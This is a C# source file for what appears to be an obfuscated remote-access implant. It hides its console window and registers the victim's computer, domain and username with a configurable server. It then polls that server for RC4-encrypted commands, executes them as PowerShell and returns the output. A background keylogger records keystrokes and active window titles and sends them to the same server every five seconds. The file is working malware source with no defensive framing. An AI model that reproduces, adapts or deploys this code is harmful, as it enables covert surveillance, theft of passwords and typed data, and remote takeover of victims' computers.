using System;
using System.Threading;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Web.Script.Serialization;
using System.Runtime.InteropServices;
using System.Timers;

namespace VAR1 {

 public class VAR2 {
  public string UUID {
   get;
   set;
  }
  public string ID {
   get;
   set;
  }
  public string Data {
   get;
   set;
  }
 }
 public class TrustAllCertsPolicy: ICertificatePolicy {
  public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) {
   return true;
  }
 }
 public class VAR6 {
  [DllImport("user32.dll")]
  static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);

  [DllImport("user32.dll")]
  static extern short GetAsyncKeyState(int VAR34);

  [DllImport("user32.dll")]
  static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll")]
  static extern int GetWindowText(IntPtr VAR92, StringBuilder VAR90, int VAR80);

  [DllImport("user32.dll")]
  static extern int GetWindowTextLength(IntPtr VAR79);

  private static string VAR7;
  private static string VAR8;
  private static byte[] VAR9;
  private static int VAR10;
  private static string VAR11;
  private static int VAR12;
  private static StringBuilder VAR105 = new StringBuilder();

  public static string VAR107() {
   var VAR106 = "";
   var VAR108 = GetForegroundWindow();
   var VAR109 = GetWindowTextLength(VAR108) + 1;
   var VAR110 = new StringBuilder(VAR109);
   if (GetWindowText(VAR108, VAR110, VAR109) > 0) {
    VAR106 = VAR110.ToString();
   }
   return VAR106;
  }

  public static void VAR110(object VAR111, ElapsedEventArgs VAR112) {
   if (VAR105.Length != 0) {
    byte[] VAR121 = Encoding.ASCII.GetBytes(VAR105.ToString());
    string VAR120 = String.Format("userinput {0}", Convert.ToBase64String(VAR121));
    VAR21(VAR120, Guid.NewGuid().ToString());
   }
   VAR105.Clear();
  }

  public static void VAR104() {

   System.Timers.Timer VAR113 = new System.Timers.Timer();
   VAR113.Elapsed += new ElapsedEventHandler(VAR110);
   VAR113.Interval = 5000;
   VAR113.Enabled = true;
   string VAR114 = VAR107();
   string VAR115 = VAR114;

   while (true) {
    foreach(int VAR116 in Enum.GetValues(typeof(Keys))) {
     int VAR119 = GetAsyncKeyState(VAR116);
     if (VAR119 == -32767) {

      var VAR117 = Enum.GetName(typeof(Keys), VAR116).ToLower();

      if (VAR116 == 1 || VAR116 == 2) {
       string VAR118 = VAR107();

       if (VAR115 != VAR118) {
        VAR105.Append(String.Format("\n- {0}\n----\n", VAR118));
        VAR115 = VAR118;

       }
      } else if (Control.ModifierKeys == Keys.Shift) {
       if (VAR116 == 8) {
        VAR105.Append("[BackSpace]");
       } else if (VAR116 == 9) {
        VAR105.Append("[Tab]");
       } else if (VAR116 == 13) {
        VAR105.Append("[Enter]");
       } else if (VAR116 == 27) {
        VAR105.Append("[Esc]");
       } else if (VAR116 == 32) {
        VAR105.Append(" ");
       } else if (VAR116 == 48) {
        VAR105.Append(")");
       } else if (VAR116 == 49) {
        VAR105.Append("!");
       } else if (VAR116 == 50) {
        VAR105.Append("@");
       } else if (VAR116 == 51) {
        VAR105.Append("#");
       } else if (VAR116 == 52) {
        VAR105.Append("$");
       } else if (VAR116 == 53) {
        VAR105.Append("%");
       } else if (VAR116 == 54) {
        VAR105.Append("^");
       } else if (VAR116 == 55) {
        VAR105.Append("&");
       } else if (VAR116 == 56) {
        VAR105.Append("*");
       } else if (VAR116 == 57) {
        VAR105.Append("(");
       } else if (VAR116 >= 65 && VAR116 <= 90) {
        VAR105.Append(VAR117.ToUpper());
       } else if (VAR116 >= 96 && VAR116 <= 105) {
        VAR105.Append(VAR117.ToUpper());
       } else if (VAR116 >= 112 && VAR116 <= 135) {
        VAR105.Append(VAR117.ToUpper());
       } else if (VAR116 == 144) {
        VAR105.Append("[NumLock]");
       } else if (VAR116 == 186) {
        VAR105.Append(":");
       } else if (VAR116 == 187) {
        VAR105.Append("+");
       } else if (VAR116 == 188) {
        VAR105.Append("<");
       } else if (VAR116 == 189) {
        VAR105.Append("_");
       } else if (VAR116 == 190) {
        VAR105.Append(">");
       } else if (VAR116 == 191) {
        VAR105.Append("?");
       } else if (VAR116 == 192) {
        VAR105.Append("~");
       } else if (VAR116 == 219) {
        VAR105.Append("{");
       } else if (VAR116 == 220) {
        VAR105.Append("|");
       } else if (VAR116 == 221) {
        VAR105.Append("}");
       } else if (VAR116 == 222) {
        VAR105.Append("\"");
       }
      } else {
       if (VAR116 == 8) {
        VAR105.Append("[BackSpace]");
       } else if (VAR116 == 9) {
        VAR105.Append("[Tab]");
       } else if (VAR116 == 13) {
        VAR105.Append("[Enter]\n");
       } else if (VAR116 == 27) {
        VAR105.Append("[Esc]");
       } else if (VAR116 == 32) {
        VAR105.Append(" ");
       } else if (VAR116 == 48) {
        VAR105.Append("0");
       } else if (VAR116 == 49) {
        VAR105.Append("1");
       } else if (VAR116 == 50) {
        VAR105.Append("2");
       } else if (VAR116 == 51) {
        VAR105.Append("3");
       } else if (VAR116 == 52) {
        VAR105.Append("4");
       } else if (VAR116 == 53) {
        VAR105.Append("5");
       } else if (VAR116 == 54) {
        VAR105.Append("6");
       } else if (VAR116 == 55) {
        VAR105.Append("7");
       } else if (VAR116 == 56) {
        VAR105.Append("8");
       } else if (VAR116 == 57) {
        VAR105.Append("9");
       } else if (VAR116 >= 65 && VAR116 <= 90) {
        VAR105.Append(VAR117);
       } else if (VAR116 >= 96 && VAR116 <= 105) {
        VAR105.Append(VAR117.ToUpper());
       } else if (VAR116 >= 112 && VAR116 <= 135) {
        VAR105.Append(VAR117.ToUpper());
       } else if (VAR116 == 144) {
        VAR105.Append("[NumLock]");
       } else if (VAR116 == 186) {
        VAR105.Append(";");
       } else if (VAR116 == 187) {
        VAR105.Append("=");
       } else if (VAR116 == 188) {
        VAR105.Append(",");
       } else if (VAR116 == 189) {
        VAR105.Append("-");
       } else if (VAR116 == 190) {
        VAR105.Append(".");
       } else if (VAR116 == 191) {
        VAR105.Append("/");
       } else if (VAR116 == 192) {
        VAR105.Append("`");
       } else if (VAR116 == 219) {
        VAR105.Append("[");
       } else if (VAR116 == 220) {
        VAR105.Append("\\");
       } else if (VAR116 == 221) {
        VAR105.Append("]");
       } else if (VAR116 == 222) {
        VAR105.Append("'");
       }
      }
      break;
     }
    }
   }
  }

  public static void Main() {
   ShowWindow(IntPtr.Zero, 0);
   VAR13("[URL]", "[KEY]", "[DELAY]");
  }

  public static void VAR13(string VAR14, string VAR15, string VAR16) {
   VAR7 = VAR14;
   VAR8 = VAR37(16);
   VAR9 = Encoding.ASCII.GetBytes(VAR15);
   VAR10 = 1000;
   Process VAR17 = Process.GetCurrentProcess();
   VAR12 = VAR17.Id;
   try {
    VAR10 = Convert.ToInt32(VAR16);
   } catch {}
   bool VAR18 = false;
   string VAR19 = String.Format("register {0} {1}", VAR8, VAR20());
   VAR11 = Environment.OSVersion.ToString();
   VAR21(VAR19, null);
   Thread VAR103 = new Thread(() => VAR104());
   VAR103.Start();
   while (!VAR18) {
    try {
     Thread.Sleep(VAR10);
     string VAR22 = VAR21(null, null);
     VAR2 VAR23 = VAR24(VAR22);
     if (VAR23.UUID != null) {
      VAR23.Data = VAR25(VAR23.Data);
      string[] VAR26 = VAR27(VAR23.Data);
      if (VAR26[0].Equals("delay")) {
       VAR10 = Convert.ToInt32(VAR26[1]);
      } else if (VAR26[0].Equals("exit")) {
       VAR18 = true;
      } else {
       Thread VAR29 = new Thread(() => VAR28(VAR23.Data, VAR23.UUID));
       VAR29.Start();
      }
     }
    } catch {}
   }
  }
  protected static string[] VAR27(string VAR30) {
   return VAR30.Split(new char[] {
    ' '
   }, 2);
  }
  protected static string VAR25(string VAR31) {
   byte[] VAR32 = Convert.FromBase64String(VAR31);
   return Encoding.ASCII.GetString(VAR16.VAR28(VAR9, VAR32));
  }
  protected static VAR2 VAR24(string VAR33) {
   var VAR34 = new JavaScriptSerializer();
   VAR2 VAR35 = VAR34.Deserialize < VAR2 > (VAR33);
   return VAR35;
  }
  protected static string VAR20() {
   string VAR36 = String.Format("{0} {1}\\{2}", Environment.GetEnvironmentVariable("COMPUTERNAME"), Environment.GetEnvironmentVariable("USERDOMAIN"), Environment.GetEnvironmentVariable("USERNAME"));
   return VAR36;
  }
  protected static string VAR37(int VAR38) {
   StringBuilder VAR39 = new StringBuilder();
   string VAR40 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
   Int32 VAR3 = (Int32)(DateTime.Now.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
   Process VAR41 = Process.GetCurrentProcess();
   Random VAR42 = new Random(VAR41.Id ^ VAR3);
   if (VAR38 == 0) {
    VAR38 = VAR42.Next(1, 16);
   }
   for (int VAR43 = 0; VAR43 < VAR38; VAR43++) {
    VAR39.Append(VAR40[VAR42.Next(VAR40.Length - 1)]);
   }
   VAR12 = VAR42.Next();
   return VAR39.ToString();
  }
  public static void VAR28(string VAR44, string VAR45) {
   string VAR46;
   StringBuilder VAR47 = new StringBuilder();
   try {
    Runspace VAR48 = RunspaceFactory.CreateRunspace();
    VAR48.Open();
    RunspaceInvoke VAR49 = new RunspaceInvoke(VAR48);
    Pipeline VAR50 = VAR48.CreatePipeline();
    VAR50.Commands.AddScript(VAR44);
    VAR50.Commands.Add("Out-String");
    Collection < PSObject > VAR51 = VAR50.Invoke();
    VAR48.Close();
    foreach(PSObject VAR52 in VAR51) {
     VAR47.AppendLine(VAR52.ToString());
    }
    VAR46 = VAR47.ToString();
   } catch (Exception VAR53) {
    VAR46 = VAR53.ToString();
   }
   VAR21(VAR46, VAR45);
  }
  public static string VAR21(string VAR55, string VAR56) {
   byte[] VAR57;
   if (VAR55 != null) {
    VAR57 = VAR16.VAR28(VAR9, Encoding.ASCII.GetBytes(VAR55));
   } else {
    VAR57 = new byte[0];
   }
   string VAR58 = String.Format("{0}/{1}/", VAR7, VAR37(0));
   HttpWebRequest VAR59 = (HttpWebRequest) WebRequest.Create(VAR58);
   VAR59.Method = "POST";
   VAR59.UserAgent = VAR11;
   VAR59.Timeout = 10000;
   VAR59.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
   Stream VAR60 = null;
   StreamReader VAR61 = null;
   string VAR62;
   string VAR63 = "";
   if (VAR57.Length > 0) {
    VAR63 = Convert.ToBase64String(VAR57);
   }
   VAR2 VAR64 = new VAR2 {
    UUID = VAR56, ID = VAR8, Data = VAR63
   };
   var VAR65 = new JavaScriptSerializer();
   var VAR66 = VAR65.Serialize(VAR64).ToString();
   VAR59.ContentType = "application/json";
   try {
    VAR60 = VAR59.GetRequestStream();
    VAR60.Write(Encoding.ASCII.GetBytes(VAR66), 0, VAR66.Length);
   } finally {
    if (VAR60 != null) {
     VAR60.Dispose();
    }
   }
   try {
    VAR60 = VAR59.GetResponse().GetResponseStream();
    VAR61 = new StreamReader(VAR60);
    VAR62 = VAR61.ReadToEnd();
   } catch {
    VAR62 = "";
   }
   return VAR62.ToString();
  }
 }
 public class VAR16 {
  public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
   int VAR20, VAR21, VAR22, VAR23, VAR24;
   int[] VAR25, VAR26;
   byte[] VAR27;
   VAR25 = new int[256];
   VAR26 = new int[256];
   VAR27 = new byte[VAR19.Length];
   for (VAR21 = 0; VAR21 < 256; VAR21++) {
    VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
    VAR26[VAR21] = VAR21;
   }
   for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++) {
    VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
    VAR24 = VAR26[VAR21];
    VAR26[VAR21] = VAR26[VAR22];
    VAR26[VAR22] = VAR24;
   }
   for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++) {
    VAR20++;
    VAR20 %= 256;
    VAR22 += VAR26[VAR20];
    VAR22 %= 256;
    VAR24 = VAR26[VAR20];
    VAR26[VAR20] = VAR26[VAR22];
    VAR26[VAR22] = VAR24;
    VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
    VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
   }
   return VAR27;
  }
  public static byte[] VAR28(byte[] VAR29, byte[] VAR30) {
   try {
    return VAR17(VAR29, VAR30);
   } catch {
    return new byte[0];
   }
  }
 }
}
